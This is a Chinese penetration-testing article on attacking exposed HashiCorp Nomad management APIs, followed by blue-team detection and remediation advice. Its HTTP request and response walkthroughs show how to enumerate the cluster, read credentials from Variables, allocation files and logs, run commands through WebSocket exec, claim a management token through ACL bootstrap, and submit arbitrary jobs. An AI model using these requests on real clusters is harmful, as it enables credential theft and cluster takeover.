---
title: "Nomad管理面打点与API利用技术"
date: 2026-06-15T13:06:08+08:00
draft: false
weight: 60
description: "围绕Nomad相关攻击面与利用路径，分析打点识别、接口枚举、风险链条、日志痕迹与防守处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "调度平台", "Nomad"]
---

# Nomad管理面打点与API利用技术

`HashiCorp Nomad` 是典型的高价值调度与运行时控制平面。它不像普通业务后台只承载某个单点功能，而是同时控制：

- 作业提交与版本更新
- 任务组调度与资源编排
- Allocation 生命周期
- Client 节点文件系统、日志与调试入口
- ACL Token、Policy、Role 与 Auth Method
- Variables、事件流、指标与审计

对攻击者来说，Nomad 的价值不在于某一个“未授权页面”，而在于它把“工作负载是什么、跑在哪、怎么调试、谁能提交、谁能执行、机密路径在哪里”这些原本分散的信息集中暴露到了同一套 UI 与 HTTP API 上。

一旦 Nomad UI 或 API 被错误暴露、ACL 未启用或初始引导不完整、管理 Token 泄露、匿名权限过宽，或者某个低权限 Token 被错误授予 `read-logs`、`read-fs`、`alloc-exec` 等能力，攻击者通常可以在很短时间内回收：

- 数据中心、region、leader、peer 拓扑
- Node、Job、Allocation 与 Service 画像
- 任务日志中的环境变量、连接串与内部地址
- Allocation 工作目录中的配置文件、模板渲染结果与中间产物
- 是否可以继续进入 `alloc exec`
- Variables 中的敏感键值
- ACL 当前是否仍可 bootstrap 或已存在高权限控制面

本文聚焦打点与利用侧，重点记录：

1. 如何识别当前目标是否为 Nomad
2. 哪些状态与枚举接口最值得优先探测
3. 如何围绕 Job、Allocation、Client FS、Logs、Exec 和 Variables 建立攻击价值判断
4. 如何从 ACL、事件流、指标和审计痕迹判断当前边界
5. 蓝队如何从访问日志、审计日志与事件流发现这类打点

---

## 0. 攻击面概览

### 0.1 常见路径

首轮至少应枚举：

- `/ui/`
- `/v1/status/leader`
- `/v1/status/peers`
- `/v1/agent/members`
- `/v1/agent/self`
- `/v1/nodes`
- `/v1/jobs`
- `/v1/allocations`
- `/v1/services`
- `/v1/var/`
- `/v1/vars`
- `/v1/event/stream`
- `/v1/acl/bootstrap`
- `/v1/acl/token/self`
- `/v1/metrics`

如果目标是经过反向代理或 API 网关暴露，还应额外关注：

- 是否只转发了 `/ui/`
- 是否完整转发了 `/v1/client/*`
- 是否允许 WebSocket 升级到 `alloc exec`

### 0.2 认证头与上下文参数

Nomad 常见认证方式是：

- `X-Nomad-Token: <SecretID>`
- `Authorization: Bearer <SecretID>`

常见上下文字段包括：

- `namespace`
- `region`
- `prefix`
- `filter`

其中 `namespace=*` 在很多列表接口里非常关键，因为它可能直接把多个业务环境或团队的作业、分配与变量一起回收出来。

### 0.3 响应头价值

Nomad 的多个 API 会返回：

- `X-Nomad-Index`
- `X-Nomad-KnownLeader`
- `X-Nomad-LastContact`
- `X-Nomad-NextToken`

这些头能帮助判断：

- 当前读到的数据是否来自已知 leader
- 结果是否是阻塞查询返回
- 是否还有后续分页

### 0.4 打点收益优先级

按“最快转成真实攻击价值”的顺序，Nomad 的打点收益一般可排为：

1. 确认是否为 Nomad、是否开启 UI、leader 与 peers 是否可读
2. 枚举 nodes、jobs、allocations、services，建立工作负载画像
3. 判断当前 Token 能否读 `alloc logs`、`alloc fs`、`variables`
4. 判断是否存在 `alloc exec` 与高权限 ACL 面
5. 判断是否存在 `acl/bootstrap`、全局事件流、指标与审计暴露

---

## 1. 第一轮打点：确认是否为 Nomad

### 1.1 UI 识别

Nomad UI 与 API 通常共用 `4646` 端口。官方文档明确说明，如果 HTTP API 绑定到公网可访问地址，API 与 UI 就都可能暴露到该边界上。

#### 请求示例

```http
GET /ui/ HTTP/1.1
Host: nomad.target.example:4646
User-Agent: Mozilla/5.0
Accept: text/html
Connection: close
```

#### 典型响应示例

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-store
```

页面和前端资源中常见特征包括：

- `Nomad`
- `Jobs`
- `Clients`
- `Evaluations`
- `Allocations`

UI 一旦可达，通常意味着：

- 反向代理已把 Nomad 管理面公开出来
- 后续可以继续验证 `/v1/status/leader`、`/v1/jobs`、`/v1/allocations`
- 如果 WebSocket 也被放通，后续还有可能衔接到 `alloc exec`

### 1.2 `/v1/status/leader`

`/status/leader` 是最值得优先探测的无认证信息面之一。

#### 请求示例

```http
GET /v1/status/leader HTTP/1.1
Host: nomad.target.example:4646
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
"10.20.30.21:4647"
```

这条响应会直接暴露：

- 当前 leader 的 RPC 地址
- 目标确实是 Nomad server
- 集群状态至少基本可用

### 1.3 `/v1/status/peers`

#### 请求示例

```http
GET /v1/status/peers HTTP/1.1
Host: nomad.target.example:4646
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  "10.20.30.21:4647",
  "10.20.30.22:4647",
  "10.20.30.23:4647"
]
```

这类返回可以快速建立：

- server 仲裁面
- 节点数量
- 进一步的 region / datacenter 拓扑判断

### 1.4 `/v1/agent/self`

#### 请求示例

```http
GET /v1/agent/self HTTP/1.1
Host: nomad.target.example:4646
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "config": {
    "Region": "global",
    "Datacenter": "dc1",
    "NodeName": "nomad-server-1",
    "Server": true,
    "Version": "1.6.8"
  },
  "member": {
    "Name": "nomad-server-1.global",
    "Addr": "10.20.30.21",
    "Port": 4648,
    "Tags": {
      "dc": "dc1",
      "region": "global",
      "role": "nomad"
    }
  }
}
```

最值得记录的是：

- `Region`
- `Datacenter`
- `NodeName`
- `Server`
- `Version`

### 1.5 `/v1/agent/members`

#### 请求示例

```http
GET /v1/agent/members HTTP/1.1
Host: nomad.target.example:4646
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "Name": "nomad-server-1.global",
    "Addr": "10.20.30.21",
    "Port": 4648,
    "Status": "alive",
    "Tags": {
      "dc": "dc1",
      "role": "nomad",
      "region": "global"
    }
  },
  {
    "Name": "nomad-client-08.global",
    "Addr": "10.20.41.28",
    "Port": 4648,
    "Status": "alive",
    "Tags": {
      "dc": "dc1",
      "region": "global"
    }
  }
]
```

这条接口的价值在于：

- 帮助区分 server 与 client 节点
- 回收 gossip 成员地址
- 为后续 Node、Allocation、Client API 打点建立坐标

---

## 2. 第二轮打点：Node、Job 与 Allocation 画像

### 2.1 `/v1/nodes`

#### 请求示例

```http
GET /v1/nodes HTTP/1.1
Host: nomad.target.example:4646
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "ID": "f2a245fe-2fc6-feb2-7131-51f5b8d3f6a7",
    "Datacenter": "dc1",
    "Name": "nomad-client-08",
    "NodeClass": "prod-linux",
    "Status": "ready",
    "Drain": false,
    "Version": "1.6.8"
  }
]
```

这类返回可直接建立：

- client 节点名称
- datacenter 分布
- node class 命名体系
- 运行状态与 drain 状态

### 2.2 `/v1/jobs`

`/v1/jobs` 是 Nomad 管理面里最直接的工作负载清单入口。

#### 请求示例

```http
GET /v1/jobs?namespace=* HTTP/1.1
Host: nomad.target.example:4646
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "ID": "payment-api",
    "Name": "payment-api",
    "Namespace": "prod",
    "Type": "service",
    "Priority": 50,
    "Status": "running",
    "JobSummary": {
      "Summary": {
        "web": {
          "Running": 6,
          "Failed": 0
        }
      }
    }
  },
  {
    "ID": "nightly-report",
    "Name": "nightly-report",
    "Namespace": "batch",
    "Type": "batch",
    "Status": "running"
  }
]
```

这条返回极有价值，因为它会直接暴露：

- 作业命名
- 业务环境
- 作业类型
- 运行副本
- 失败情况

如果响应头中还有：

```http
X-Nomad-NextToken: nightly-report
```

说明当前结果仅是一页，后续还能继续翻页回收。

### 2.3 Job 详情

#### 请求示例

```http
GET /v1/job/payment-api?namespace=prod HTTP/1.1
Host: nomad.target.example:4646
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "ID": "payment-api",
  "Name": "payment-api",
  "Type": "service",
  "Datacenters": [
    "dc1"
  ],
  "TaskGroups": [
    {
      "Name": "web",
      "Count": 6,
      "Tasks": [
        {
          "Name": "payment-api",
          "Driver": "docker",
          "Config": {
            "image": "registry.internal.example/payment-api:2.14.7",
            "ports": [
              "http"
            ]
          },
          "Env": {
            "SPRING_PROFILES_ACTIVE": "prod"
          }
        }
      ]
    }
  ]
}
```

这类响应的真实收益包括：

- 镜像仓库地址
- 版本号
- 驱动类型
- task group 名称
- 部分环境变量

### 2.4 `/v1/job/:job_id/allocations`

#### 请求示例

```http
GET /v1/job/payment-api/allocations?namespace=prod HTTP/1.1
Host: nomad.target.example:4646
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "ID": "5457f16d-0f87-8e6b-5e91-0c7da3a41eb7",
    "JobID": "payment-api",
    "NodeID": "f2a245fe-2fc6-feb2-7131-51f5b8d3f6a7",
    "Namespace": "prod",
    "ClientStatus": "running",
    "DesiredStatus": "run",
    "TaskStates": {
      "payment-api": {
        "State": "running"
      }
    }
  }
]
```

这一步会把 Job 画像进一步落到：

- 具体 allocation ID
- 具体 node ID
- 当前 client status
- 任务状态

### 2.5 `/v1/allocations`

#### 请求示例

```http
GET /v1/allocations?namespace=*&resources=true HTTP/1.1
Host: nomad.target.example:4646
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "ID": "5457f16d-0f87-8e6b-5e91-0c7da3a41eb7",
    "JobID": "payment-api",
    "JobVersion": 42,
    "ClientDescription": "Tasks are running",
    "ClientStatus": "running",
    "AllocatedResources": {
      "Tasks": {
        "payment-api": {
          "Cpu": {
            "CpuShares": 500
          },
          "Memory": {
            "MemoryMB": 256
          }
        }
      }
    }
  }
]
```

这类数据适合用于：

- 判断任务规模
- 判断哪些作业更可能是核心业务
- 从资源画像推断中间件、批处理或常驻服务

---

## 3. 第三轮打点：服务、变量与运行时情报面

### 3.1 `/v1/services`

#### 请求示例

```http
GET /v1/services HTTP/1.1
Host: nomad.target.example:4646
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "Namespace": "prod",
    "Services": [
      {
        "ServiceName": "payment-api",
        "Tags": [
          "http",
          "public"
        ]
      }
    ]
  }
]
```

这类返回可以补全：

- Service 名称
- Consul / Nomad 注册标签
- 服务是否可能面向公网或内部流量

### 3.2 Variables 列表

Nomad Variables 是一个非常高价值的配置与密钥面。官方文档明确指出，`/v1/vars` 只返回 metadata，不返回解密后的正文，但这本身就足以暴露很多路径结构。

#### 请求示例

```http
GET /v1/vars?namespace=prod&prefix=apps/ HTTP/1.1
Host: nomad.target.example:4646
X-Nomad-Token: 4f4dbf9d-6b90-9c34-b0bc-0ddf4c55e738
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "Namespace": "prod",
    "Path": "apps/payment-api",
    "CreateIndex": 1457,
    "ModifyIndex": 1457,
    "CreateTime": 1662061225600373000,
    "ModifyTime": 1662061225600373000
  },
  {
    "Namespace": "prod",
    "Path": "apps/postgres",
    "CreateIndex": 1602,
    "ModifyIndex": 1644,
    "CreateTime": 1662061717905426000,
    "ModifyTime": 1662062162982630000
  }
]
```

即便只有 metadata，也足以帮助攻击者建立：

- 命名空间与业务边界
- 变量路径习惯
- 哪些键最值得优先读取

### 3.3 读取 Variable

#### 请求示例

```http
GET /v1/var/apps/payment-api?namespace=prod HTTP/1.1
Host: nomad.target.example:4646
X-Nomad-Token: 4f4dbf9d-6b90-9c34-b0bc-0ddf4c55e738
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "Namespace": "prod",
  "Path": "apps/payment-api",
  "Items": {
    "db_user": "payment_app",
    "db_pass": "Str0ngPass!2026",
    "redis_pass": "redis-prod-pass"
  }
}
```

这类返回意味着：

- 打点已不再是“看调度信息”
- 已经直接触达应用运行所需的敏感配置

### 3.4 失败响应同样有价值

#### 典型失败响应示例

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json
```

```json
{
  "Error": "Permission denied"
}
```

这类失败说明：

- Token 有效，但路径 ACL 不足
- 仍应继续转向 `jobs`、`allocations`、`logs`、`read-fs` 或其它 namespace

---

## 4. 第四轮打点：Client 文件系统与日志面

### 4.1 为什么 Client 面特别重要

Nomad 和很多纯控制面不同，它允许通过 client 相关 API 接触 allocation 工作目录。官方文档与 CLI 参考都明确表明：

- `alloc fs` 可浏览 allocation 工作目录
- `alloc logs` 可读取任务 stdout/stderr
- `client/fs/*` 可按路径读取文件内容

这意味着一旦 ACL 配置错误，攻击者可以从“知道有某个任务在跑”快速升级到：

- 读取模板渲染结果
- 读取配置文件
- 读取日志
- 读取本地生成的临时文件

### 4.2 Allocation 目录结构的意义

官方文档给出的 allocation 工作目录通常包括：

- `alloc/data/`
- `alloc/logs/`
- `alloc/tmp/`
- `<task>/local/`
- `<task>/private/`
- `<task>/secrets/`
- `<task>/tmp/`

其中最值得优先注意的是：

- `alloc/logs/`
- `<task>/local/`
- `<task>/secrets/`

### 4.3 列目录 `/v1/client/fs/ls/:alloc_id`

#### 请求示例

```http
GET /v1/client/fs/ls/5457f16d-0f87-8e6b-5e91-0c7da3a41eb7?path=/ HTTP/1.1
Host: nomad.target.example:4646
X-Nomad-Token: 4f4dbf9d-6b90-9c34-b0bc-0ddf4c55e738
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "Name": "alloc",
    "IsDir": true,
    "Size": 4096,
    "FileMode": 2147484141
  },
  {
    "Name": "payment-api",
    "IsDir": true,
    "Size": 4096,
    "FileMode": 2147484141
  }
]
```

#### 深一层请求示例

```http
GET /v1/client/fs/ls/5457f16d-0f87-8e6b-5e91-0c7da3a41eb7?path=payment-api/local HTTP/1.1
Host: nomad.target.example:4646
X-Nomad-Token: 4f4dbf9d-6b90-9c34-b0bc-0ddf4c55e738
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "Name": "application-prod.yml",
    "IsDir": false,
    "Size": 684
  },
  {
    "Name": "bootstrap.sh",
    "IsDir": false,
    "Size": 1120
  }
]
```

### 4.4 直接读取文件 `/v1/client/fs/cat/:alloc_id`

#### 请求示例

```http
GET /v1/client/fs/cat/5457f16d-0f87-8e6b-5e91-0c7da3a41eb7?path=payment-api/local/application-prod.yml HTTP/1.1
Host: nomad.target.example:4646
X-Nomad-Token: 4f4dbf9d-6b90-9c34-b0bc-0ddf4c55e738
Accept: */*
Connection: close
```

#### 典型响应示例

```yaml
spring:
  datasource:
    url: jdbc:postgresql://10.20.42.18:5432/payment
    username: payment_app
    password: Str0ngPass!2026
redis:
  host: 10.20.41.15
  password: redis-prod-pass
```

一旦这类读取成功，风险已经从“管理面暴露”升级为“配置与凭据直接外泄”。

### 4.5 按偏移读取 `/v1/client/fs/readat/:alloc_id`

#### 请求示例

```http
GET /v1/client/fs/readat/5457f16d-0f87-8e6b-5e91-0c7da3a41eb7?path=alloc/logs/payment-api.stdout.0&offset=0&limit=512 HTTP/1.1
Host: nomad.target.example:4646
X-Nomad-Token: 4f4dbf9d-6b90-9c34-b0bc-0ddf4c55e738
Accept: */*
Connection: close
```

#### 典型响应示例

```text
2026-06-15T03:11:52Z INFO Starting payment-api
2026-06-15T03:11:53Z INFO Loaded profile prod
2026-06-15T03:11:54Z ERROR JDBC connection failed: jdbc:postgresql://10.20.42.18:5432/payment
```

### 4.6 日志流 `/v1/client/fs/logs/:alloc_id`

官方 `alloc logs` 文档说明，读取任务日志需要 `read-logs`、`read-job`、`list-jobs` 能力。

#### 请求示例

```http
GET /v1/client/fs/logs/5457f16d-0f87-8e6b-5e91-0c7da3a41eb7?task=payment-api&type=stdout&origin=start&offset=0 HTTP/1.1
Host: nomad.target.example:4646
X-Nomad-Token: 4f4dbf9d-6b90-9c34-b0bc-0ddf4c55e738
Accept: */*
Connection: close
```

#### 典型响应示例

```text
2026-06-15T03:11:52Z INFO Starting payment-api
2026-06-15T03:11:53Z INFO Profile=prod
2026-06-15T03:11:54Z INFO Vault addr=http://vault.service.consul:8200
```

日志面通常是最容易回收二次打点线索的位置，因为它常常直接暴露：

- 内部服务地址
- Vault / Consul / Redis / PostgreSQL 地址
- 模板渲染失败信息
- 环境变量
- 栈信息

---

## 5. 第五轮打点：Remote Exec 与 WebSocket 入口

### 5.1 `alloc exec` 的风险本质

一旦当前 Token 具备 `alloc-exec`，Nomad 不再只是一个“读控制面”。它会变成：

- 进入运行中任务容器或隔离环境
- 执行命令
- 读取进程环境
- 二次探测内网
- 回收挂载与凭据

对于不具备文件系统隔离的驱动，如 `raw_exec`，官方文档与命令参考都额外强调需要 `alloc-node-exec`，风险等级更高。

### 5.2 WebSocket Exec 请求

#### 请求示例

```http
GET /v1/client/allocation/5457f16d-0f87-8e6b-5e91-0c7da3a41eb7/exec?task=payment-api&command=%5B%22%2Fbin%2Fsh%22%2C%22-c%22%2C%22id%22%5D&tty=true HTTP/1.1
Host: nomad.target.example:4646
X-Nomad-Token: 4f4dbf9d-6b90-9c34-b0bc-0ddf4c55e738
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
```

#### 典型响应帧示例

```json
{"stdout":{"data":"dWlkPTEwMDAgZ2lkPTEwMDAgZ3JvdXBzPTEwMDAK"}}
```

Base64 解码后可得到：

```text
uid=1000 gid=1000 groups=1000
```

#### 结束帧示例

```json
{"exited":true,"result":{"exit_code":0}}
```

### 5.3 失败响应同样有价值

#### 典型失败响应示例

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json
```

```json
{
  "Error": "Permission denied"
}
```

这类失败意味着：

- 当前 Token 仍可能具备读日志、读文件等低一级能力
- WebSocket 未必是网络问题，也可能只是 ACL 不足

### 5.4 UI 中的 Exec 按钮

Nomad 官方博客长期强调 Web UI 中集成了远程 `exec` 能力。对打点来说，这意味着：

- 浏览器可达 UI 不代表只是“看状态”
- 只要 ACL 与 WebSocket 链路配置错误，UI 就可能成为远程命令执行入口

---

## 6. 第六轮打点：ACL、Bootstrap 与身份控制面

### 6.1 `X-Nomad-Token`

Nomad 官方 API 明确说明，ACL 开启后可以通过 `X-Nomad-Token` 或 Bearer Token 提交 `SecretID`。因此所有打点都应把“当前是否有泄露 token”作为优先判断条件。

#### 请求示例

```http
GET /v1/acl/token/self HTTP/1.1
Host: nomad.target.example:4646
X-Nomad-Token: 8176afd3-772d-0b71-8f85-7fa5d903e9d4
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "AccessorID": "aa534e09-6a07-0a45-2295-a7f77063d429",
  "SecretID": "8176afd3-772d-0b71-8f85-7fa5d903e9d4",
  "Name": "ci-read-token",
  "Type": "client",
  "Policies": [
    "readonly",
    "prod-logs"
  ],
  "Global": true
}
```

这条返回可以立刻告诉你：

- token 类型
- 绑定了哪些 policies
- 是 local 还是 global

### 6.2 `/v1/acl/bootstrap`

`/v1/acl/bootstrap` 是 Nomad 最需要优先记录的高危面之一。官方 API 文档明确说明它可以在 ACL 系统未完成引导时生成初始 management token，并且该接口默认不要求 ACL。

#### 请求示例

```http
POST /v1/acl/bootstrap HTTP/1.1
Host: nomad.target.example:4646
Content-Length: 0
Connection: close
```

#### 典型成功响应示例

```json
{
  "AccessorID": "b780e702-98ce-521f-2e5f-c6b87de05b24",
  "SecretID": "3f4a0fcd-7c42-773c-25db-2d31ba0c05fe",
  "Name": "Bootstrap Token",
  "Type": "management",
  "Global": true,
  "CreateIndex": 7,
  "ModifyIndex": 7
}
```

这类响应意味着：

- 目标 ACL 仍处于可 bootstrap 状态
- 攻击者已直接获得 management 级控制能力
- 风险等级立即上升为调度平面接管

#### 典型失败响应示例

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json
```

```json
{
  "Error": "ACL bootstrap no longer allowed"
}
```

这个 `403` 不代表没有价值，它说明：

- 集群 ACL 已引导完成
- 当前更应转向查找已泄露的 `SecretID`
- 还应关注 UI 会话、CI 变量、Nomad CLI 环境变量和任务模板输出

### 6.3 ACL Auth Methods

如果拿到了更高权限 token，`/v1/acl/auth-methods` 会暴露：

- OIDC / JWT 等外部身份接入方式
- token locality
- 默认登录方式
- 是否开启 `VerboseLogging`

这类信息适合帮助判断：

- SSO 是否可被滥用
- 是否可能从 IdP 声明映射出更高权限 token

---

## 7. 第七轮打点：作业提交、解析与服务变更面

### 7.1 `/v1/jobs` 提交面

Nomad API 允许通过 JSON jobspec 直接注册作业。官方文档明确指出，HTTP API 使用 JSON 格式的 jobspec，而不是 HCL。

#### 请求示例

```http
POST /v1/jobs HTTP/1.1
Host: nomad.target.example:4646
X-Nomad-Token: 3f4a0fcd-7c42-773c-25db-2d31ba0c05fe
Content-Type: application/json
Connection: close

{
  "Job": {
    "ID": "debug-shell",
    "Name": "debug-shell",
    "Type": "batch",
    "Datacenters": ["dc1"],
    "TaskGroups": [
      {
        "Name": "shell",
        "Count": 1,
        "Tasks": [
          {
            "Name": "shell",
            "Driver": "docker",
            "Config": {
              "image": "alpine:3.20",
              "command": "/bin/sh",
              "args": ["-c", "sleep 3600"]
            },
            "Resources": {
              "CPU": 100,
              "MemoryMB": 64
            }
          }
        ]
      }
    ]
  }
}
```

#### 典型响应示例

```json
{
  "EvalID": "61f2cb4b-5017-8a0f-4d5a-1a4ea055c9d0",
  "EvalCreateIndex": 9124,
  "JobModifyIndex": 9123,
  "Warnings": ""
}
```

一旦这类提交成功，意义已经不再是打点，而是对调度面的主动控制。

### 7.2 `/v1/jobs/parse`

Nomad API 文档明确说明，`/job/parse` 用于把 HCL jobspec 转换为 JSON。该接口本身虽然不一定高危，但它能帮助判断：

- HCL 解析链是否开放
- 某些自动化或 GitOps 提交流程是否可被重放

### 7.3 作业服务清单

#### 请求示例

```http
GET /v1/job/payment-api/services?namespace=prod HTTP/1.1
Host: nomad.target.example:4646
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "ServiceName": "payment-api",
    "Namespace": "prod",
    "Port": 29702,
    "Tags": [
      "http",
      "public"
    ]
  }
]
```

这类返回适合辅助判断：

- 服务实际暴露端口
- 是否注册到服务发现
- 任务是否还挂有 sidecar 或 mesh 标记

---

## 8. 第八轮打点：事件流、指标与持续观察

### 8.1 `/v1/event/stream`

官方事件流文档明确指出，`/v1/event/stream` 会以 `ndjson` 形式返回 backlog 与后续实时事件。只要权限足够，它非常适合作为“持续侦察”接口。

#### 请求示例

```http
GET /v1/event/stream?namespace=*&topic=Job&topic=Allocation&topic=Evaluation HTTP/1.1
Host: nomad.target.example:4646
X-Nomad-Token: 3f4a0fcd-7c42-773c-25db-2d31ba0c05fe
Accept: application/json
Connection: keep-alive
```

#### 典型响应示例

```json
{
  "Index": 9128,
  "Events": [
    {
      "Topic": "Job",
      "Type": "JobRegistered",
      "Key": "payment-api",
      "Namespace": "prod",
      "Index": 9128,
      "Payload": {
        "Job": {
          "ID": "payment-api",
          "Version": 43
        }
      }
    }
  ]
}
```

#### 心跳帧示例

```json
{
  "Index": 0,
  "Events": []
}
```

事件流的真实价值在于：

- 持续感知新作业注册
- 感知 allocation 更新
- 感知节点注册与 drain
- 感知部署推进和失败

### 8.2 `/v1/metrics?format=prometheus`

Nomad 官方文档明确说明，指标可以通过 `/v1/metrics` 访问，并支持 Prometheus 格式。

#### 请求示例

```http
GET /v1/metrics?format=prometheus HTTP/1.1
Host: nomad.target.example:4646
Accept: text/plain
Connection: close
```

#### 典型响应示例

```text
# HELP nomad_nomad_broker_total_pending Pending evaluations
# TYPE nomad_nomad_broker_total_pending gauge
nomad_nomad_broker_total_pending 0
# HELP nomad_runtime_num_goroutines Number of goroutines
# TYPE nomad_runtime_num_goroutines gauge
nomad_runtime_num_goroutines 413
```

如果开启了 `publish_allocation_metrics` 或 `publish_node_metrics`，这里还可能额外暴露：

- allocation 指标
- host 指标
- 作业相关状态指标

### 8.3 指标面的风险边界

未授权指标面虽然不一定直接给出 secrets，但它能帮助攻击者：

- 判断集群负载高峰
- 判断 leader 是否健康
- 判断某些作业是否异常波动
- 推断攻击或调试时机

---

## 9. 高危错误部署场景

### 9.1 ACL 未 bootstrap 完成

如果 `POST /v1/acl/bootstrap` 直接成功，说明目标处于极高危状态。此时攻击者可以直接获得：

- management token
- 全局控制面读写
- 作业提交与修改能力

### 9.2 匿名或弱权限 Token 可读 Job 与 Allocation

即便没有 management token，只要一个 token 具备：

- `list-jobs`
- `read-job`
- `read-logs`
- `read-fs`

就已经足以完成极深的运行时侦察。

### 9.3 `alloc exec` 放开

如果 `alloc exec` 可用，风险已经不再是“知道集群跑什么”，而是：

- 真正进入任务运行环境
- 读取环境变量与文件
- 继续横向内部服务

### 9.4 Variables 滥用

Variables 一旦可读，攻击者通常会直接回收：

- 数据库凭据
- 中间件凭据
- 云访问密钥
- 下游控制面地址

### 9.5 `raw_exec` 的特殊风险

官方命令参考明确指出，如果目标任务使用 `raw_exec` 这类不具备文件系统隔离的驱动，执行相关能力需要更高权限，但一旦误配成功，边界会更接近宿主机级别，而不是单纯容器级别。

---

## 10. 蓝队检测与处置

### 10.1 反向代理与访问日志

应重点识别对以下路径的连续访问：

- `/v1/status/leader`
- `/v1/status/peers`
- `/v1/jobs`
- `/v1/job/*/allocations`
- `/v1/allocations`
- `/v1/client/fs/*`
- `/v1/client/allocation/*/exec`
- `/v1/vars`
- `/v1/var/*`
- `/v1/acl/bootstrap`
- `/v1/acl/token/self`
- `/v1/event/stream`
- `/v1/metrics`

#### 日志示例

```text
10.10.10.21 - - [15/Jun/2026:14:21:11 +0800] "GET /v1/status/leader HTTP/1.1" 200 17 "-" "curl/8.7.1"
```

```text
10.10.10.21 - - [15/Jun/2026:14:21:14 +0800] "GET /v1/jobs?namespace=* HTTP/1.1" 200 2148 "-" "python-requests/2.32.3"
```

```text
10.10.10.21 - - [15/Jun/2026:14:21:18 +0800] "GET /v1/client/fs/cat/5457f16d-0f87-8e6b-5e91-0c7da3a41eb7?path=payment-api/local/application-prod.yml HTTP/1.1" 200 684 "-" "python-requests/2.32.3"
```

第三类日志基本可以判定访问者已进入“读取运行时文件”的阶段。

### 10.2 Nomad Enterprise 审计日志

Nomad Enterprise 审计日志在 HTTP API 层记录请求生命周期，官方博客明确指出事件通常分为：

- `OperationReceived`
- `OperationComplete`

#### 审计示例：请求阶段

```json
{
  "type": "audit",
  "stage": "OperationReceived",
  "request": {
    "operation": "GET",
    "path": "/v1/jobs",
    "remote_addr": "10.10.10.21:58534",
    "user_agent": "python-requests/2.32.3"
  },
  "auth": {
    "token_accessor": "aa534e09-6a07-0a45-2295-a7f77063d429"
  }
}
```

#### 审计示例：完成阶段

```json
{
  "type": "audit",
  "stage": "OperationComplete",
  "request": {
    "operation": "GET",
    "path": "/v1/client/fs/cat/5457f16d-0f87-8e6b-5e91-0c7da3a41eb7"
  },
  "response": {
    "status": 200
  }
}
```

蓝队最应关注：

- `request.path`
- `request.remote_addr`
- `request.user_agent`
- `auth.token_accessor`
- `response.status`

### 10.3 事件流侧检测

如果已经有专门的消费程序监听 `/v1/event/stream`，可以更快发现：

- `JobRegistered`
- `AllocationCreated`
- `AllocationUpdated`
- `NodeRegistration`
- `PlanResult`

这类事件并不直接替代审计日志，但很适合用来：

- 关联某次异常作业注册
- 跟踪某个 job 的快速变更链

### 10.4 Telemetry 与 `/v1/metrics`

官方监控文档建议关注：

- leader 相关指标
- raft 指标
- job summary 指标
- allocation 与 host 指标

对于异常打点检测，至少应对以下模式建立基线：

- `/v1/metrics` 被非常规来源读取
- 某来源短时间密集读取 `/v1/jobs`、`/v1/allocations`
- 短时间出现 `alloc exec` 或 client fs 大量读取

### 10.5 处置建议

发现 Nomad 管理面被打点后，应优先做：

1. 收敛 `4646` 暴露范围，禁止低信任网络直接访问 UI 与 API
2. 检查 ACL 是否已 bootstrap 完成，并确认不存在残留 bootstrap 风险
3. 轮换所有泄露嫌疑 `SecretID`
4. 审查 `read-logs`、`read-fs`、`alloc-exec`、`alloc-node-exec` 权限授予
5. 检查 Variables 中是否存放敏感配置，并轮换已暴露凭据
6. 检查是否已经发生 `exec`、文件读取、日志读取和异常作业注册

长期建议：

- 默认启用 ACL，并最小化匿名与只读 token
- 不把 UI 与 API 暴露到公网
- 对 `client/fs/*`、`alloc exec`、`acl/bootstrap`、`vars` 建独立告警
- 对 `raw_exec` 工作负载单独加固
- 确保审计日志与访问日志可长期保留并可按 token accessor 检索

---

## 11. 复盘清单

### 11.1 红队侧

- 是否确认了 leader、peers、region、datacenter
- 是否完成了 `jobs`、`allocations`、`nodes` 的整体画像
- 是否验证了 `services`、`vars`、`client fs`、`logs`
- 是否确认了 `alloc exec` 是否可用
- 是否验证了 `acl/bootstrap` 与 `acl/token/self`

### 11.2 蓝队侧

- 是否能识别从 `leader -> jobs -> allocations -> client fs/logs` 的连续访问链
- 是否能识别 WebSocket `exec` 升级请求
- 是否能区分普通 UI 浏览与脚本化批量枚举
- 是否掌握了高风险 token 的 accessor 与用途

### 11.3 应急侧

- 是否确认是否已有变量、日志或文件被读取
- 是否确认是否已有新作业被异常提交
- 是否确认是否已有 `exec` 会话发生
- 是否完成高权限 token、应用凭据与下游服务凭据轮换

---

## 12. 总结

`Nomad` 的真正风险，不只是“一个调度 UI 可访问”，而在于它把：

- 工作负载清单
- 调度状态
- 节点拓扑
- 运行时日志
- 工作目录文件
- 远程执行
- 变量配置
- 身份与审计

统一放到了同一条管理平面上。

对打点来说，更值得沉淀的方法学是：

- 先用 `status`、`agent`、`nodes` 确认集群轮廓
- 再用 `jobs`、`allocations`、`services` 建立业务画像
- 再集中验证 `client fs`、`logs`、`variables`
- 最后判断 `alloc exec`、`acl bootstrap`、事件流与指标面的真实边界

只有把这些面串起来，才能把“Nomad 暴露”真正转化成结构化攻击价值判断。

---

## 参考资料

